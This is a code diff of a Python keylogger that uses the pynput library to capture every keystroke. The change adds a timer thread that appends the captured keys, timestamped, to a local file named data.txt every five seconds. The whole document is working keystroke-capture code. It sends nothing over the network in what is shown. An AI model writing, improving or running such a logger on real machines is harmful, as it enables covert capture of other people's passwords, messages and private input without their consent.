@@ -1,6 +1,7 @@
 from pynput import keyboard
 
 import datetime as dt
+import threading
 
 string = ""
 
@@ -26,9 +27,6 @@ def on_press(key):
         else:
             # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
             string += str(key).replace("'", "")
-        with open('data.txt', 'a') as f:
-            timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
-            f.write(f'{timestamp}: {string}\n')
     except AttributeError:
         print(f'special key {key} pressed')
 
@@ -39,9 +37,22 @@ def on_release(key):
         # Stop listener
         return False
 
+def log_data():
+    global string
+    threading.Timer(5.0, log_data).start() # schedule next execution in 5 seconds
+    with open('data.txt', 'a') as f:
+        timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
+        f.write(f'{timestamp}: {string}\n')
+        string = ""
+
+
+# Create a thread to periodically write data to the file
+log_thread = threading.Thread(target=log_data)
+log_thread.start()
 
 # Collect events until released
 with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
     listener.join()
+
